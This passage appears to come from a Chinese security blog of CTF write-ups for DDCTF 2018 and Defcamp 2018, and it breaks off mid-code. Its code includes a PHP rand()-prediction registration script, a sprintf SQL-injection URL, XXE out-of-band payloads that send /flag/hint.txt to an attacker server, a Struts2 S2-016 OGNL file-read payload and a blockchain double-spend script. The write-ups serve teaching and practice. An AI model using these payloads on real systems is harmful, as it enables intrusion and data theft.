web的框架，更不熟悉java的类包管理方法，所以碰了挺久壁的。如果你按../../WEB-INF/classes/InitListener.class下载是不行的，正确的方法是classes后面按照该类的导入方式依次拼接路径，比如这道题的正确路径就是：../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class。 需要注意一定要找到类，而不能下载包。 &emsp;&emsp;下载的.class文件需要进行反编译成.java文件，这个很多在线网站都能做。 &emsp;&emsp;其余文件按照上面所述的方法都可以找到并下载，完了以后能拿到的文件如下： &emsp;&emsp;下面就是代码审计的时候了。 &emsp;&emsp;首先需要关注的就是FlagController.java文件，它起到路由的作用。123456789101112131415161718192021222324252627@RequestMapping({\"flag\"}) // 定义根路径public class FlagController{ @Autowired private FlagService flagService; public FlagController() {} // 接收类似 /flag/getflag/1111路径 用post请求 @RequestMapping(value={\"/getflag/{email:[0-9a-zA-Z']+}\"}, method={org.springframework.web.bind.annotation.RequestMethod.POST}) public String getFlag(@PathVariable(\"email\") String email, ModelMap model) { Flag flag = flagService.getFlagByEmail(email); return \"Encrypted flag : \" + flag.getFlag(); } @RequestMapping({\"/testflag/{flag}\"}) public String submitFlag(@PathVariable(\"flag\") String flag, ModelMap model) { String[] fs = flag.split(\"[{}]\"); Long longFlag = Long.valueOf(fs[1]); int i = flagService.exist(flag); if (i &gt; 0) { return \"pass!!!\"; } return \"failed!!!\"; }} &emsp;&emsp;这里的email是我们进入时系统分配的，在首页的右上角能找到。 &emsp;&emsp;接着我们来拿到我们的加密后的flag。 &emsp;&emsp;按照我们的第一感觉你会发现根本不按套路走，我的第一感觉是会不会真是系统错误，但跟客服姐姐交流后发现这是正常的，为了解决这个问题，只能将全部源码审计一边，最终找到了原因。 &emsp;&emsp;在InitListener.java里我们可以看到关于email、flag的定义。下面是截取的部分代码：123456789101112SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");Mac mac = Mac.getInstance(\"HmacSHA256\");mac.init(signingKey);byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());Flag flago = new Flag();flago.setId(Integer.valueOf(id));flago.setFlag(byte2hex(data));flago.setEmail(byte2hex(e)); # 设置email的值flago.setOriginFlag(flag);flago.setUuid(uuid);flago.setOriginEmail(email); &emsp;&emsp;所以我们可以看到实际的email是经过加密的，而不是表面的。所以写个同样的java代码得到实际的email。12345678910111213141516171819import java.io.*;import javax.crypto.spec.SecretKeySpec;import javax.crypto.Mac;import java.security.Key;class test { public static void main (String[] args) throws java.lang.Exception { System.out.println(\"hi\"); SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\"); Mac mac = Mac.getInstance(\"HmacSHA256\"); mac.init(signingKey); String email = \"3113936212117314317@didichuxing.com\"; // 首页得到的email byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes()); System.out.println(e); String tmp1 = byte2hex(e); }} &emsp;&emsp;我们将得到的值提交。 &emsp;&emsp;现在我们就得到了属于自己的加密后的flag。接下来就是分析flag的加密方法，然后进行相应的解密。下面是相应的加密代码（截取部分）：1234567891011121314151617181920String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");// 这里是得到sdl.ks的绝对路径String ksPath = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/sdl.ks\");KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());// 加载密钥文件FileInputStream inputStream = new FileInputStream(ksPath);keyStore.load(inputStream, p.toCharArray());Key key = keyStore.getKey(\"www.didichuxing.com\", p.toCharArray());// 选择加密算法，这里是 RSA 加密算法Cipher cipher = Cipher.getInstance(key.getAlgorithm());// 1：代表加密模式； 2：代表解密模式cipher.init(1, key);byte[] data = cipher.doFinal(flag.getBytes());// 设置flagflago.setFlag(byte2hex(data)); &emsp;&emsp;分析了flag的加密算法后，我们就来写下解密算法。密钥文件sdl.ks的下载这里就不赘述了。并且这道题是属于：私钥加密，公钥解密的一个类型。 &emsp;&emsp;由于对java的加解密库的函数不了解，也怪自己搜索的关键字不好，，这里卡了好一会。。。终于在某天早上起床后，，脑瓜子灵光一闪，想到了一些关键字，然后在google结果的第二条就找到了解决方法。下面是解密脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;import java.security.PublicKey;import java.security.KeyStore;import java.security.cert.Certificate;import javax.crypto.Cipher;class test { public static void main (String[] args) throws java.lang.Exception { String ksPath = \"e:/WEB-INF_classes_sdl.ks\"; String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\"); System.out.println(KeyStore.getDefaultType()); // jks KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); FileInputStream inputStream = new FileInputStream(ksPath); keyStore.load(inputStream, p.toCharArray()); Certificate publicCertificate = keyStore.getCertificate(\"www.didichuxing.com\"); PublicKey publicKey = publicCertificate.getPublicKey(); System.out.println(publicKey.getAlgorithm()); // rsa System.out.println(publicKey.getEncoded()); String miwen = \"506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE\"; Cipher cipher =Cipher.getInstance(\"RSA\"); cipher.init(2, publicKey); byte[] result = cipher.doFinal(hex2byte(miwen.getBytes())); System.out.println(new String(result)); } public static byte[] hex2byte(byte[] b) { if ((b.length % 2) != 0) throw new IllegalArgumentException(\"长度不是偶数\"); byte[] b2 = new byte[b.length / 2]; for (int n = 0; n &lt; b.length; n += 2) { String item = new String(b, n, 2); b2[n / 2] = (byte) Integer.parseInt(item, 16); } return b2; }} &emsp;&emsp;最后flag：DDCTF{1797193649441981961}。 &emsp;&emsp;考虑篇幅的原因，下题writeup重新开篇。","link":"/2018/04/ddctf-writeup2/"},{"title":"DDCTF2018 2道web writeup","text":"我的博客 提示：www.tar.gz &emsp;&emsp;根据提示能找到网站备份文件，下载后只有三个文件，从代码上并没有发现什么漏洞，而我们的目标是注册一个标志位是admin的账号，其本身存在的admin是个弱密码，但这个账号并没有admin的标志位，所以我们只能自己想办法注册一个。首先看看注册部分关键的代码：12345678910111213141516171819202122232425262728293031&lt;?phpsession_start();include('config.php');if($_SERVER['REQUEST_METHOD'] === \"POST\") { if(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) { die(\"CSRF token error!\"); } $admin = \"admin###\" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 32); $username = (isset($_POST['username']) === true &amp;&amp; $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username'); $password = (isset($_POST['password']) === true &amp;&amp; $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password'); $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : ''; if (strlen($username) &gt; 32 || strlen($password) &gt; 32) { die('Invalid input'); } $sth = $pdo-&gt;prepare('SELECT username FROM users WHERE username = :username'); $sth-&gt;execute([':username' =&gt; $username]); if ($sth-&gt;fetch() !== false) { die('username has been registered'); } if($code === $admin) { $identity = \"admin\"; } else { $identity = \"guest\"; } .... &emsp;&emsp;可以看到我们只有让我们post的$code与$admin的值相等才能通过验证，而$admin的值又是经过str_shuffle随机打乱的32个字符。而str_shuffle的源码如下： &emsp;&emsp;可以看到它使用了rand()作为随机数产生器，从而打乱字符顺序，而rand()产生的并不是真的随机数而是个伪随机数。我们可以通过下面的公式去预测第32位以后的随机数。12PHP_RAND_MAX = 2147483647num[n] = (num[n-3] + num[n-31]) mod (PHP_RAND_MAX) &emsp;&emsp;当我们知道了生成的随机数我们就能预测出str_shuffle打乱的结果，最终在这道题中注册一个admin权限的账号。下面是payload：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# -*- coding: utf-8 -*-import requestsfrom bs4 import BeautifulSoupPHP_RAND_MAX = 2147483647url = 'http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php'sess = requests.session()# num[n] = (num[n-3] + num[n-31]) mod (PHP_RAND_MAX)def RAND_RANGE(__n, __min, __max, __tmax): return (__min) + int(((__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))# 仿照PHP版的shuffledef shuffle(strs, tokens): lens = len(strs) strs = list(strs) n_left = lens i = 0 while (n_left &gt; 0): n_left -= 1 rnd_idx = tokens[i] i += 1 rnd_idx = RAND_RANGE(rnd_idx, 0 ,n_left, PHP_RAND_MAX) if (rnd_idx != n_left): strs[rnd_idx], strs[n_left] = strs[n_left], strs[rnd_idx] return ''.join(strs)num = []for i in range(32): html = sess.get(url) context = html.content soup = BeautifulSoup(context, 'lxml') csrf = soup.select('#csrf')[0].get('value') if i == 31: tmp = (num[i - 3] + num[i - 31]) % PHP_RAND_MAX if tmp == int(csrf): print('预测成功！') else: print('预测失败！') exit(1) num.append(int(csrf))# 预测后面 62个tokens = []for i in range(32,94): tmp = (num[i - 3] + num[i - 31]) % PHP_RAND_MAX num.append(int(tmp)) tokens.append(int(tmp))strs = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'code = shuffle(strs, tokens)[:32]code = 'admin###' + codeprint('预测code: ' + code)print('预测csrf: ' + str(num[31]))data = { # 在访问第33次的时候CSRF应该是上一次的CSRF，也就是第32次，注意这里是从0开始 'csrf':num[31], 'username':'junay', 'password':'123', 'code':code}html = sess.post(url, data)print(html.content) &emsp;&emsp;上面的程序预测的时候有可能存在1/-1的误差，如果出现预测失败重新运行几次即可。 &emsp;&emsp;有了账号后，我们就能登录，然后审计登录后的代码：12345678910111213141516// index.php 截取关键代码if(isset($_GET['id'])){ $id = addslashes($_GET['id']); if(isset($_GET['title'])){ $title = addslashes($_GET['title']); $title = sprintf(\"AND title='%s'\", $title); }else{ $title = ''; } $sql = sprintf(\"SELECT * FROM article WHERE id='%s' $title\", $id); foreach ($pdo-&gt;query($sql) as $row) { echo \"&lt;h1&gt;\".$row['title'].\"&lt;/h1&gt;&lt;br&gt;\".$row['content']; die(); }} &emsp;&emsp;这个代码中使用了存在漏洞的sprintf函数，我们可以通过格式化漏洞绕过addslashes。在格式化的时候sprintf支持填充，我们可以使用%1$'绕过反斜杠。 &emsp;&emsp;所以我们的payload就是：1http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&amp;title=Welcome%1$&apos; union select 1,f14g,3 from `key` limit 0,1 -- + 喝杯Java冷静下&emsp;&emsp;首先能在源代码中找到账号密码： 12// 解开后admin: admin_password_2333_caicaikan &emsp;&emsp;使用这个账号密码我们能登录进后台，在后台里我们可以发现一个文件下载的漏洞。12// urlhttp://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=informations/readme.txt &emsp;&emsp;按照上次Java web的题目，我们开始找配置文件，比如：web.xml、applicationContext.xml等，但当我们找class文件时，却没有收获，但是匹配文件中的包名给我思路。 &emsp;&emsp;在GitHub上搜了一下，果然找到了这个框架。地址：quick4j。然后按照这个项目的路径我们就能找到关键的类，最终能找到的文件差不多如下： &emsp;&emsp;标注的文件是控制文件，也是我们需要关注的文件，其内容如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package com.eliteams.quick4j.web.controller;// 删除了导入包@Controller@RequestMapping({\"/user\"})public class UserController{ public static final String hintFile = \"/flag/hint.txt\"; @Resource private UserService userService; @RequestMapping(value={\"/login\"}, method={org.springframework.web.bind.annotation.RequestMethod.POST}) public String login(@Valid User user, BindingResult result, Model model, HttpServletRequest request) { try { Subject subject = SecurityUtils.getSubject(); if (subject.isAuthenticated()) { return \"redirect:/\"; } if (result.hasErrors()) { model.addAttribute(\"error\", \"参数错误！\"); return \"login\"; } if ((user.getUsername().isEmpty()) || (user.getUsername() == null) || (user.getPassword().isEmpty()) || (user.getPassword() == null)) { return \"login\"; } subject.login(new UsernamePasswordToken(user.getUsername(), user.getPassword())); User authUserInfo = this.userService.selectByUsername(user.getUsername()); request.getSession().setAttribute(\"userInfo\", authUserInfo); } catch (AuthenticationException e) { model.addAttribute(\"error\", \"用户名或密码错误 ！\"); return \"login\"; } return \"redirect:/\"; } @RequestMapping(value={\"/logout\"}, method={org.springframework.web.bind.annotation.RequestMethod.GET}) public String logout(HttpSession session) { session.removeAttribute(\"userInfo\"); Subject subject = SecurityUtils.getSubject(); subject.logout(); return \"login\"; } @RequestMapping(value={\"/admin\"}, produces={\"text/html;charset=UTF-8\"}) @ResponseBody @RequiresRoles({\"admin\"}) public String admin() { return \"拥有admin角色,能访问\"; } @RequestMapping(value={\"/create\"}, produces={\"text/html;charset=UTF-8\"}) @ResponseBody @RequiresPermissions({\"user:create\"}) public String create() { return \"拥有user:create权限,能访问\"; } @RequestMapping(value={\"/getInfomation\"}, produces={\"text/html;charset=UTF-8\"}) @ResponseBody @RequiresRoles({\"guest\"}) public ResponseEntity&lt;byte[]&gt; download(HttpServletRequest request, String filename) throws IOException { if ((filename.contains(\"../\")) || (filename.contains(\"./\")) || (filename.contains(\"..\\\\\")) || (filename.contains(\".\\\\\"))) { return null; } String path = request.getServletContext().getRealPath(\"/\"); System.out.println(path); File file = new File(path + File.separator + filename); HttpHeaders headers = new HttpHeaders(); String downloadFielName = new String(filename.getBytes(\"UTF-8\"), \"iso-8859-1\"); headers.setContentDispositionFormData(\"attachment\", downloadFielName); headers.setContentType(MediaType.APPLICATION_OCTET_STREAM); return new ResponseEntity(FileUtils.readFileToByteArray(file), headers, HttpStatus.CREATED); } @RequestMapping(value={\"/nicaicaikan_url_23333_secret\"}, produces={\"text/html;charset=UTF-8\"}) @ResponseBody @RequiresRoles({\"super_admin\"}) public String xmlView(String xmlData) { if (xmlData.length() &gt;= 1000) { return \"Too long~~\"; } DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setExpandEntityReferences(true); try { DocumentBuilder builder = factory.newDocumentBuilder(); InputStream xmlInputStream = new ByteArrayInputStream(xmlData.getBytes()); Document localDocument = builder.parse(xmlInputStream); } catch (ParserConfigurationException e) { e.printStackTrace(); return \"ParserConfigurationException\"; } catch (SAXException e) { e.printStackTrace(); return \"SAXException\"; } catch (IOException e) { e.printStackTrace(); return \"IOException\"; } return \"ok~ try to read /flag/hint.txt\"; }} &emsp;&emsp;所以我们下一步就需要访问nicaicaikan_url_23333_secret，但是已经有的admin账号并不是super_admin，而且也没有注册账号的接口存在。这种情况下只能照着GitHub上的模板去翻其他文件，终于在SecurityRealm.java中找到了线索： &emsp;&emsp;这里注意到我们需要找到一个字符串的hashCode()==0，经过Google后，我们能在Stack Overflow找到一个答案：f5a5a608。 &emsp;&emsp;登录后并没有发现特别的功能，但是代码里已经给了我们非常明显的提示：xxe攻击，因为它自身并没有回显，所以我们需要找到一个支持xxe外带数据的方法，解决方案就是：xxe oob。我们先在自己服务器上放置evil.xml，内容如下：123&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:port/%file;'&gt;\"&gt;%int;%send; &emsp;&emsp;ps: 上面的port是nc监听的端口，接着构造payload：12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM \"file:///flag/hint.txt\"&gt;&lt;!ENTITY % remote SYSTEM \"http://ip:port/evil.xml\"&gt;%remote; %all;%send;]&gt; &emsp;&emsp;发送过去： &emsp;&emsp;我们就能在服务器上收到信息： &emsp;&emsp;根据提示我们接着构造payload：12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM \"http://tomcat_2:8080/\"&gt;&lt;!ENTITY % remote SYSTEM \"http://ip:port/evil.xml\"&gt;%remote; %all;%send;]&gt; &emsp;&emsp;结果： &emsp;&emsp;再来：12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM \"http://tomcat_2:8080/hello.action\"&gt;&lt;!ENTITY % remote SYSTEM \"http://ip:port/evil.xml\"&gt;%remote; %all;%send;]&gt; &emsp;&emsp;这时候用到了题目的提示： 提示：第二层关卡应用版本号为2.3.1 &emsp;&emsp;所以我们找找Struts2 2.3.1版本的漏洞，此篇文章有较为详细的记载。 &emsp;&emsp;经过多次尝试后我们能利用的漏洞版本是S2-016，接着再去找漏洞脚本，一个能用的payload如下：1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM \"http://tomcat_2:8080/hello.action?redirect:${#a=new java.io.FileInputStream('/flag/flag.txt'),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[60],#c.read(#d),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#matt.println(#d),#matt.flush(),#matt.close()}\"&gt;&lt;!ENTITY % dtd SYSTEM \"http://ip:port/evil.xml\"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; &emsp;&emsp;在进行复现的时候经常会出现IOException，按照其他的writeup里的payload也是如此，这也有可能是环境问题导致的。 &emsp;&emsp;参考链接： &emsp;&emsp;https://impakho.com/post/ddctf-2018-writeup &emsp;&emsp;https://thief.one/2017/06/20/1/ &emsp;&emsp;http://www.freebuf.com/articles/web/97833.html &emsp;&emsp;https://github.com/Eliteams/quick4j &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/05/ddctf-writeup5/"},{"title":"2018 DDCTF mini blockchain(区块链) writeup","text":"mini blockchain(区块链)&emsp;&emsp;滴滴的这道blockchain真的让人耳目一新，同时感觉也预兆了以后区块链技术出现在CTF上可能会成为一个常态，所以非常有必要去认真的了解一下这个东西。以下关于区块链的表述仅以我两天的学习结果，，，所以路过的大佬发现有表述不对的地方，劳烦指正。 &emsp;&emsp;题目描述：123某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求 &emsp;&emsp;首先先介绍下这道题的解法，先从整体切入，这样可能方便理解后面的操作。下面先清晰几个概念： 1、这道题整的解法是 51% （双花）攻击。 2、请于正常的区块链区分开来，题目环境中只有你一个玩家，并没有人与你竞争（挖矿）。 3、商店交易采用0确认，而不是现实中的6确认。 4、当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链。 5、区块链允许添加空块 51%（双花）攻击&emsp;&emsp;51%（双花）攻击可以达到的目的就是使攻击前的交易作废，这里的前不一定是前一个，而是很大程度上取决于你的算力的。让之前的交易作废有什么好处呢？这里我们就要考虑0确认和6确认的区别了。 &emsp;&emsp;先看看6确认： 当产生一笔交易时，区块链的P2P网络会广播这笔交易，这笔交易会被一个挖矿节点收到，并验证，如果这个挖矿节点挖到区块（生成的hash满足条件）后，并且这笔交易的手续费足够吸引这个节点去打包进区块，那这笔交易就会被打包进区块。因此就得到了一个确认，这个矿工也拿走了相应的手续费。 这个挖矿节点打包后，会把区块广播给其他节点。其他节点验证并广播这个区块。 如果这个区块得到更多的挖矿节点的验证确认，那就得到了更多的确认。这样这笔交易就被记录到了比特币区块链，并成为了比特币账本的一部分。如果得到6个确认后，我们就认为它永远不可变了。 &emsp;&emsp;0确认就同样的道理了，那就是不需要别人确认，就如我们生活中的一手交钱一手交货，不同的是生活中我们处于中心化社会，银行会帮我们确认。而6确认就是需要经过6个人(区块被挖出)交易才确定。 &emsp;&emsp;可以看到对0确认和6确认进行51%(双花)攻击的难度是不一样的，6确认需要的算力明显要大，因为他要多比其他人生成6个区块。（应该可以这样理解吧，可能我还需要继续学习，如上，如有不对可以联系我(jay80#protonmail.com)改正，在这也谢谢各位大佬了。）好在，题目并不是采用6确认。 &emsp;&emsp;然后再看看这里的51% 攻击，其实这里说的51%是指算力，也就是这种攻击需要攻击者具备全网51%的算力，因为这样才有机会使自己生成（挖出）区块的速度超过其他人，然后按区块链的规则：当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链，就达到了撤销原来链上已经存在的交易，拿回该交易使用了的钱的目的，这里我的另一个理解就是可以使交易回滚，从而追回被盗的钱。 &emsp;&emsp;对攻击的原理有了简单的理解后，我们就来看看这道题从原理上应该怎么做。先放两张自己画的图： 实际构造&emsp;&emsp;原理上明白了以后，我们就开始从代码上进行实际攻击。首先我们先看一下一个标准的区块是咋样的，下面其实就是黑客盗取银行的区块：12345678910111213141516171819202122232425262728293031{ \"nonce\": \"HAHA, I AM THE BANK NOW!\", \"prev\": \"5bc355ab21fd7e07040e2882f36ff8fba90809cbaa27b80bc1439a6e85beec25\", \"hash\": \"e31e1a9a8797d464304c34f215b65edf510bd0dd251fd5d23f9a41017aaba205\", \"transactions\": [ { \"input\": [ \"e95c5a89-3f0e-4bd6-a4bc-8ff006fa2a42\" ], \"signature\": [ \"8cf74260504449ce72c537b587b534c7f93e459d97898faea8a3a68622bbe01f2117fba4cfd3cff69f12e209d74cf87c\" ], \"hash\": \"a314b20a66ab94c735f0f82c47ea679869980eb98f0d937a27531f328374119c\", \"output\": [ { \"amount\": 999999, \"hash\": \"513c7eb598f25efb6201f5f2df66842fc92a3890b6927d1b5563ab88ef87eeba\", \"addr\": \"955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131\", \"id\": \"467e55e7-95a9-4551-b2f8-2d1321468fd4\" }, { \"amount\": 1, \"hash\": \"748ac974d0cc1dbff6a19778e4e7c145e3cd569b26a872132ff7ca4ccab067fb\", \"addr\": \"b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985\", \"id\": \"42155d27-4934-49d6-acc4-4a299cebe63f\" } ] } ], \"height\": 1 //这个由系统生成，我们不用管} &emsp;&emsp;按照流程，我们应该构造一个转钱给商店的区块。但通过代码，我们可以发现转账的时候是需要私钥签名的，也就是这个signature段。 &emsp;&emsp;做题的时候也卡着这，想着是不是能拿到银行的私钥。但通过看writeup发现，这些信息我们可以通过黑客留下的signature直接绕过，并且上一步的input也可以从黑客的区块中得到。所以我们就可以直接构造转账给商店的区块了，并且通过51%攻击使黑客转走的钱追回。 &emsp;&emsp;下面直接放出完整的payload脚本，需要特别提醒的是要注意每个区块的prev。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100# -*- coding: utf-8 -*-import json, uuid, hashlibimport random,stringEMPTY_HASH = '0' * 64DIFFICULTY = int('00000' + 'f' * 59, 16)def hash(x): return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()def hash_reducer(x, y): return hash(hash(x) + hash(y))# 对 output 进行hashdef hash_utxo(utxo): return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])def create_output_utxo(addr_to, amount): utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount} utxo['hash'] = str(hash_utxo(utxo)) return utxo# 对 transactions 进行hashdef hash_tx(tx): return reduce(hash_reducer, [ reduce(hash_reducer, tx['input'], EMPTY_HASH), reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH) ])#对整个块 hashdef hash_block(block): return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])prev = \"5bc355ab21fd7e07040e2882f36ff8fba90809cbaa27b80bc1439a6e85beec25\"input = [\"e95c5a89-3f0e-4bd6-a4bc-8ff006fa2a42\"]signature = ['8cf74260504449ce72c537b587b534c7f93e459d97898faea8a3a68622bbe01f2117fba4cfd3cff69f12e209d74cf87c']address = 'b81ff6d961082076f3801190a731958aec88053e8191258b0ad9399eeecd8306924d2d2a047b5ec1ed8332bf7a53e735'output = [create_output_utxo(address,1000000)]transactions = { \"input\":input, \"signature\":signature, \"output\":output }# 对 transactions 进行签名hash_transactions = hash_tx(transactions)transactions['hash'] = str(hash_transactions)# 爆破（挖矿，找到满足条件的hash）def fuzz(block, size=20): CHARS = string.letters + string.digits while True: rnds = ''.join(random.choice(CHARS) for _ in range(size)) block['nonce'] = rnds block_hash = str(hash_block(block)) # 转换成 16 进制 tmp_hash = int(block_hash, 16) # POW 验证工作 if tmp_hash &lt; DIFFICULTY: block['hash'] = block_hash return block# 创建符合条件的块block = { \"prev\":prev, \"transactions\":[transactions]}ok_block = fuzz(block)print(json.dumps(ok_block))# 创建一个空块empty_tmp = { \"prev\" : ok_block['hash'], \"transactions\" : []}empty_block1 = fuzz(empty_tmp)print(json.dumps(empty_block1))empty_tmp = { \"prev\" : empty_block1['hash'], \"transactions\" : []}empty_block2 = fuzz(empty_tmp)print(json.dumps(empty_block2))empty_tmp = { \"prev\" : empty_block2['hash'], \"transactions\" : []}empty_block3 = fuzz(empty_tmp)print(json.dumps(empty_block3))empty_tmp = { \"prev\" : empty_block3['hash'], \"transactions\" : []}empty_block4 = fuzz(empty_tmp)print(json.dumps(empty_block4)) &emsp;&emsp;运行后会得到5个区块，然后依次post就可以得到flag。 &emsp;&emsp;post第三块的时候会得到一个钻石。 &emsp;&emsp;post第5块的时候会得到第二个钻石。 &emsp;&emsp;然后访问/flag，从而得到flag。 &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/04/ddctf-writeup4/"},{"title":"Defcamp(DCTF) 2018-chat Prototype pollution attack","text":"前言&emsp;&emsp;这是Defcamp CTF 2018中的一道web题(chat)题解，在deep clone的时候使用了Prototype pollution attack，原型污染攻击的方法解题。 &emsp;&emsp;拿到题目后可以得到客户端和服务端的源码，所以首先进行源码审计。server.js：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151var fs = require('fs'); var server = require('http').createServer()var io = require('socket.io')(server)var clientManager = require('./clientManager')var helper = require('./helper') var defaultSettings = JSON.parse(fs.readFileSync('default_settings.json', 'utf8'));function sendMessageToClient(client, from, message) { var msg = { from: from, message: message }; client.emit('message', msg); console.log(msg) return true;}function sendMessageToChannel(channel, from, message) { var msg = { from: typeof from !== 'string' ? clientManager.getUsername(from): from, message: message, channel: channel }; if(typeof from !== 'string') { if(!clientManager.isSubscribedTo(from, channel)) { console.log('Could not send message',msg,' from', clientManager.getUsername(from),'to',channel,'because he is not subscribed.') return false; } } var clients = clientManager.getSubscribedToChannel(channel); for(var i = 0; i&lt;clients.length;i++) { if(typeof from !== 'string') { if(clients[i].id == from.id) { continue; } } clients[i].emit('message', msg); } // console.log(msg) return true;}io.on('connection', function (client) { console.log(\"someone connecting...\"); client.on('register', function(inUser) { try { newUser = helper.clone(JSON.parse(inUser)) console.log(\"\\n[*] newUser = \" + JSON.stringify(newUser) + \"\\n\"); console.log(\"\\n[*] newUser.__proto__ = \" + JSON.stringify(newUser.__proto__) + \"\\n\"); if(!helper.validUser(newUser)) { sendMessageToClient(client,\"Server\", 'Invalid settings.') return client.disconnect(); } var keys = Object.keys(defaultSettings); // 如果用户没有设定就是用默认设置 for (var i = 0; i &lt; keys.length; ++i) { if(newUser[keys[i]] === undefined) { newUser[keys[i]] = defaultSettings[keys[i]] } } if (!clientManager.isUserAvailable(newUser.name)) { sendMessageToClient(client,\"Server\", newUser.name + ' is not available') return client.disconnect(); } // 保存 socket跟user 的关联 clientManager.registerClient(client, newUser); return sendMessageToClient(client,\"Server\", newUser.name + ' registered'); } catch(e) { console.log(e); client.disconnect() } }); client.on('join', function(channel) { try { clientManager.joinChannel(client, channel); sendMessageToClient(client,\"Server\", \"You joined channel\", channel) var u = clientManager.getUsername(client); var c = clientManager.getCountry(client); sendMessageToChannel(channel,\"Server\", helper.getAscii(\"User \" + u + \" living in \" + c + \" joined channel\")) } catch(e) { console.log(e); client.disconnect() } }); client.on('leave', function(channel) { try { client.join(channel); clientManager.leaveChannel(client, channel); sendMessageToClient(client,\"Server\", \"You left channel\", channel) var u = clientManager.getUsername(client); var c = clientManager.getCountry(client); sendMessageToChannel(channel, \"Server\", helper.getAscii(\"User \" + u + \" living in \" + c + \" left channel\")) } catch(e) { console.log(e); client.disconnect() } }); client.on('message', function(message) { try { message = 